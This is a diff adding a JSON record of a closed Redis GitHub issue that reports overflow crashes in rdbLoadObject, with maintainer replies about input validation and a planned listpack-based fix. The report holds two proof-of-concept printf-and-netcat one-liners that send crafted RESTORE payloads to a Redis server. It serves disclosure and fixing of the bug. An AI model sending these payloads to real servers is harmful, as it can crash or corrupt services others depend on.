@@ -1,0 +1,34 @@
+{
+  "issue_number": 3080.0,
+  "title": "crashes in rdbLoadObject",
+  "body": "rdbLoadObject has multiple overflow issues, which can be triggered via specially crafted argument to RESTORE command.\n\n1) If rdbtype is RDB_TYPE_LIST_QUICKLIST user-supplied binary strings will be treated as ziplists without any checks.\n\nExample:\n`printf '*4\\r\\n$7\\r\\nRESTORE\\r\\n$1\\r\\na\\r\\n$1\\r\\n0\\r\\n$33\\r\\n\\x0e\\x01\\xb0\\x00\\x00\\x00\\x10AAAAAAAA\\x02\\x00\\x00\\x80AAAA\\x07\\x00\\xc7)\\xdd\\xff\\xa2zQ\\xa4\\r\\n*2\\r\\n$4\\r\\nDUMP\\r\\n$1\\r\\na\\r\\n' | nc localhost 6379`\n\n2) Information about the size of data is completely discarded when rdbtype is any of RDB_TYPE_HASH_ZIPMAP, RDB_TYPE_LIST_ZIPLIST, RDB_TYPE_SET_INTSET, RDB_TYPE_ZSET_ZIPLIST, RDB_TYPE_HASH_ZIPLIST.\n\nExample:\n`printf '*4\\r\\n$7\\r\\nRESTORE\\r\\n$1\\r\\na\\r\\n$1\\r\\n0\\r\\n$32\\r\\n\\n\\xb0\\x00\\x00\\x00\\x10AAAAAAAA\\x02\\x00\\x00\\x80AAAA\\x07\\x00\\xfd\\xb5\\x89\\xf07\\xd4@!\\r\\n' | nc localhost 6379`\n\nCRC64 and version in payloads above needs to be adjusted for rdb version != 7.\n",
+  "state": "closed",
+  "created_at": "2016-02-11T04:59:29Z",
+  "updated_at": "2020-12-06T12:54:36Z",
+  "closed_at": "2020-12-06T12:54:36Z",
+  "labels": [
+    "critical bug",
+    "RDB",
+    "security"
+  ],
+  "comments_data": [
+    {
+      "id": 184251305,
+      "user": "antirez",
+      "created_at": "2016-02-15T15:21:59Z",
+      "body": "Hello, this is a real issue but it will be very hard to fix: this would require to sanity-check the input with an implementation that does not trust the input, so it cannot be the same as `ziplist.c` probably since this would require an API and performance change: usually the input is trusted. So a different verification function should be written for the sake of ensuring a proper formatting. Not sure what to do right now... I'll think about it, thanks for signaling this problem.\n"
+    },
+    {
+      "id": 314407273,
+      "user": "antirez",
+      "created_at": "2017-07-11T10:49:42Z",
+      "body": "Ok... that's what we are going to do with this long term: we are no longer using ziplists in the future, but a newer encoding called Listpacks (search on Google to get the specification if you wish). This new encoding have a function that can validate input under pretty fuzzy assumptions, it is enough to have the total read buffer length for the validation function to never crash and report if the encoding is sane. So when loading objects, (or accepting data via RESTORE), every input will be validated. Stay tuned..."
+    },
+    {
+      "id": 732752478,
+      "user": "oranagra",
+      "created_at": "2020-11-24T08:54:54Z",
+      "body": "FYI: This is currently being worked on in #7807"
+    }
+  ]
+}
